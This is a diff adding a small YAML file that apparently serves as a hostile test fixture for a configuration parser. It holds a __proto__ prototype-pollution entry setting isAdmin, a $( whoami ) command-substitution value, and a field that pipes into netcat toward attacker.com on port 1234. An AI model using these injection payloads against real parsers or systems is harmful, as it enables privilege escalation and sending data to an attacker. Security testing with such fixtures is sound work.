@@ -1,0 +1,6 @@
+__proto__:
+  isAdmin: true
+key: $( whoami )
+models:
+  default: gpt-4
+test: test|nc attacker.com 1234
